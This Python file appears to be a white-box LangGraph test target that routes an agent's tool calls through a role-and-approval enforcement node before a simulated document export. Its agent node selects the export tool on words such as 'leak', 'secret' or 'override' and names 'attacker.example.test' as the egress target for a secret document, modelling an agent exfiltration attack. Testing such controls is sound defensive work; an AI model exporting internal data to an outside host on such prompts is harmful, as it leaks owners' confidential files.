"""LangGraph Authorization-Aware Target Agent with Policy Enforcement Point (PEP).

PRD v4.0.2 Phase 6H.2:
- Supports Role-Based Access Control (RBAC): user vs admin.
- Supports Permission Check: read vs export.
- Supports Approval Gate: approval_token verification for sensitive operations (export_internal_docs).
- Deterministic StateGraph with explicit PEP authorization node before tool execution.
"""

from __future__ import annotations

from dataclasses import asdict, dataclass, field
from typing import Any, Dict, List, Optional, TypedDict
import uuid

from langchain_core.messages import AIMessage, BaseMessage, HumanMessage, ToolMessage
from langgraph.checkpoint.memory import MemorySaver
from langgraph.graph import END, START, StateGraph

from .instrumentation import LangGraphAuthorizationObservationProvider


@dataclass
class CallerIdentityContext:
    """Represents caller identity, assigned role, permissions, and approval tokens."""
    role: str = "user"
    permissions: List[str] = field(default_factory=lambda: ["read"])
    approval_tokens: List[str] = field(default_factory=list)

    def has_permission(self, perm: str) -> bool:
        return perm in self.permissions

    def has_valid_approval(self, token: Optional[str] = None) -> bool:
        if token is not None and token != "":
            return token in self.approval_tokens
        return len(self.approval_tokens) > 0

    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


@dataclass
class AuthorizationReceipt:
    """Receipt documenting a Policy Enforcement Point (PEP) evaluation."""
    tool: str
    role: str
    required_permission: str
    approval_required: bool
    approval_present: bool
    decision: str  # "ALLOW" or "BLOCK"
    reason: str
    call_id: Optional[str] = None

    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


class AuthAgentState(TypedDict):
    """Internal state schema for Authorization-Aware StateGraph."""
    messages: List[BaseMessage]
    active_node: str
    auth_receipt: Optional[Dict[str, Any]]
    auth_decision: str  # "ALLOW", "BLOCK", or "PENDING"
    auth_passed: bool


class LangGraphAuthorizationAwareTargetAgent:
    """White-box LangGraph Agent featuring Policy Enforcement Point (PEP) and Approval Gate."""

    def __init__(
        self,
        observation_provider: Optional[LangGraphAuthorizationObservationProvider] = None,
        identity: Optional[CallerIdentityContext] = None,
    ) -> None:
        self.target_id = "TARGET-LANGGRAPH-AUTH-WHITEBOX"
        self.provider = observation_provider or LangGraphAuthorizationObservationProvider()
        self.identity = identity or CallerIdentityContext(role="user", permissions=["read"])

        # Tool permission & approval registry
        self.tool_permissions: Dict[str, str] = {
            "query_public_kb": "read",
            "export_internal_docs": "export",
        }
        self.tool_approval_required: Dict[str, bool] = {
            "query_public_kb": False,
            "export_internal_docs": True,
        }

        # Build and compile LangGraph StateGraph
        self.checkpointer = MemorySaver()
        self.graph = self._build_graph().compile(checkpointer=self.checkpointer)

    def set_identity(self, identity: CallerIdentityContext) -> None:
        """Update caller identity and permissions for subsequent turns."""
        self.identity = identity

    def _build_graph(self) -> StateGraph:
        builder = StateGraph(AuthAgentState)

        builder.add_node("agent_node", self._agent_node)
        builder.add_node("authorization_node", self._authorization_node)
        builder.add_node("tools_node", self._tools_node)
        builder.add_node("block_node", self._block_node)

        builder.add_edge(START, "agent_node")
        builder.add_edge("agent_node", "authorization_node")

        builder.add_conditional_edges(
            "authorization_node",
            self._route_authorization,
            {
                "tools_node": "tools_node",
                "block_node": "block_node",
            },
        )

        builder.add_edge("tools_node", END)
        builder.add_edge("block_node", END)

        return builder

    # =========================================================================
    # Node Implementations
    # =========================================================================

    def _agent_node(self, state: AuthAgentState) -> Dict[str, Any]:
        """Node 1: Decision Node — Evaluates user prompt and emits tool intent."""
        self.provider.record_node_entry("agent_node", state)
        messages = state.get("messages", [])
        if not messages:
            return {"active_node": "agent_node", "auth_decision": "PENDING", "auth_passed": False}

        last_msg = messages[-1]
        user_text = str(last_msg.content).lower()

        # Deterministic tool intent selection
        if any(w in user_text for w in ["export", "untrusted", "leak", "secret", "override"]):
            call_id = f"call_export_{uuid.uuid4().hex[:6]}"
            args = {
                "doc_id": "SECRET_LEAK_001",
                "egress_target": "internal_authorized_archive" if "authorized" in user_text else "attacker.example.test",
            }
            # Extract approval token if present in stimulus
            if "approval_token=" in user_text:
                for part in user_text.split():
                    if part.startswith("approval_token="):
                        args["approval_token"] = part.split("=")[1].strip("'\"")

            self.provider.record_tool_intent("export_internal_docs", args, call_id)
            ai_msg = AIMessage(
                content="Initiating document export.",
                tool_calls=[{"name": "export_internal_docs", "args": args, "id": call_id}],
            )
            return {
                "messages": [ai_msg],
                "active_node": "agent_node",
                "auth_decision": "PENDING",
                "auth_passed": False,
            }

        # Default safe tool call
        call_id = f"call_query_{uuid.uuid4().hex[:6]}"
        args = {"query": str(last_msg.content)}
        self.provider.record_tool_intent("query_public_kb", args, call_id)
        ai_msg = AIMessage(
            content="Querying public knowledge base.",
            tool_calls=[{"name": "query_public_kb", "args": args, "id": call_id}],
        )
        return {
            "messages": [ai_msg],
            "active_node": "agent_node",
            "auth_decision": "PENDING",
            "auth_passed": False,
        }

    def _authorization_node(self, state: AuthAgentState) -> Dict[str, Any]:
        """Node 2: Policy Enforcement Point (PEP) — Authorizes tool calls via RBAC and Approval Gate."""
        self.provider.record_node_entry("authorization_node", state)
        messages = state.get("messages", [])
        if not messages:
            return {"active_node": "authorization_node", "auth_decision": "BLOCK", "auth_passed": False}

        last_ai_msg = messages[-1]
        tool_calls = getattr(last_ai_msg, "tool_calls", [])
        if not tool_calls:
            return {"active_node": "authorization_node", "auth_decision": "ALLOW", "auth_passed": True}

        target_call = tool_calls[0]
        tool_name = target_call["name"]
        tool_args = target_call.get("args", {})
        call_id = target_call.get("id")

        required_perm = self.tool_permissions.get(tool_name, "admin")
        approval_req = self.tool_approval_required.get(tool_name, False)

        # Check 1: Role / Permission Check (RBAC)
        has_perm = self.identity.has_permission(required_perm)

        # Check 2: Approval Gate Check
        # Check both identity context tokens and inline argument tokens
        passed_token = tool_args.get("approval_token")
        has_approval = False
        if not approval_req:
            has_approval = True
        else:
            has_approval = self.identity.has_valid_approval(passed_token)

        # Determine Decision
        if not has_perm:
            decision = "BLOCK"
            reason = f"Role '{self.identity.role}' lacks required permission '{required_perm}'"
            auth_passed = False
        elif approval_req and not has_approval:
            decision = "BLOCK"
            reason = f"Tool '{tool_name}' requires valid approval_token, none provided"
            auth_passed = False
        else:
            decision = "ALLOW"
            reason = f"Authorized: Role '{self.identity.role}' holds '{required_perm}' and satisfies approvals"
            auth_passed = True

        self.provider.record_authorization_check(
            tool=tool_name,
            role=self.identity.role,
            required_permission=required_perm,
            approval_required=approval_req,
            approval_present=has_approval,
            decision=decision,
            reason=reason,
            call_id=call_id,
        )

        receipt = {
            "tool": tool_name,
            "role": self.identity.role,
            "required_permission": required_perm,
            "approval_required": approval_req,
            "approval_present": has_approval,
            "decision": decision,
            "reason": reason,
            "call_id": call_id,
        }

        return {
            "active_node": "authorization_node",
            "auth_receipt": receipt,
            "auth_decision": decision,
            "auth_passed": auth_passed,
        }

    def _route_authorization(self, state: AuthAgentState) -> str:
        """Route to execution or block handler based on PEP decision."""
        if state.get("auth_passed", False) and state.get("auth_decision") == "ALLOW":
            return "tools_node"
        return "block_node"

    def _tools_node(self, state: AuthAgentState) -> Dict[str, Any]:
        """Node 3: Authorized Tools Node — Executes authorized tools."""
        self.provider.record_node_entry("tools_node", state)
        messages = state.get("messages", [])
        last_ai_msg = messages[-1]
        tool_calls = getattr(last_ai_msg, "tool_calls", [])

        tool_messages: List[BaseMessage] = []
        for call in tool_calls:
            name = call["name"]
            args = call.get("args", {})
            call_id = call.get("id")

            if name == "query_public_kb":
                result = {"status": "success", "data": f"Knowledge base results for '{args.get('query')}'"}
            elif name == "export_internal_docs":
                result = {
                    "status": "success",
                    "exported_doc": args.get("doc_id", "SECRET_LEAK_001"),
                    "egress_target": args.get("egress_target"),
                    "approval_verified": True,
                }
            else:
                result = {"status": "error", "message": f"Unknown tool '{name}'"}

            self.provider.record_tool_execution(
                tool_name=name,
                arguments=args,
                result=result,
                call_id=call_id,
                status="success",
            )
            tool_messages.append(
                ToolMessage(
                    content=str(result),
                    tool_call_id=call_id or "call_unknown",
                    name=name,
                )
            )

        self.provider.record_model_response("Tool executed successfully.")
        return {
            "messages": tool_messages,
            "active_node": "tools_node",
        }

    def _block_node(self, state: AuthAgentState) -> Dict[str, Any]:
        """Node 4: Policy Enforcement Block Handler — Blocks unauthorized execution."""
        self.provider.record_node_entry("block_node", state)
        messages = state.get("messages", [])
        last_ai_msg = messages[-1]
        tool_calls = getattr(last_ai_msg, "tool_calls", [])
        receipt = state.get("auth_receipt") or {}

        tool_messages: List[BaseMessage] = []
        for call in tool_calls:
            call_id = call.get("id") or "call_unknown"
            name = call.get("name", "unknown_tool")
            denial_msg = f"AUTHORIZATION_DENIED: {receipt.get('reason', 'Policy violation')}"

            # ToolMessage reports denial, but NO actual_tool_execution is recorded in provider
            tool_messages.append(
                ToolMessage(
                    content=denial_msg,
                    tool_call_id=call_id,
                    name=name,
                    status="error",
                )
            )

        self.provider.record_model_response(
            f"Action blocked by Policy Enforcement Point: {receipt.get('reason')}"
        )
        return {
            "messages": tool_messages,
            "active_node": "block_node",
        }

    # =========================================================================
    # Public Execution & Reset Methods
    # =========================================================================

    def run(self, user_input: str, thread_id: str = "default_auth_thread") -> Dict[str, Any]:
        """Run one conversational turn through the Authorization-Aware StateGraph."""
        config = {"configurable": {"thread_id": thread_id}}
        human_msg = HumanMessage(content=user_input)
        result = self.graph.invoke({"messages": [human_msg]}, config=config)
        return result

    def reset(
        self,
        thread_id: str = "default_auth_thread",
        identity: Optional[CallerIdentityContext] = None,
    ) -> None:
        """Reset observation provider, graph state, and caller identity."""
        self.provider.reset()
        if identity is not None:
            self.identity = identity
        else:
            self.identity = CallerIdentityContext(role="user", permissions=["read"])
        # Clear checkpoint state for thread
        self.checkpointer.storage.pop(thread_id, None)
        self.checkpointer.writes.pop(thread_id, None)
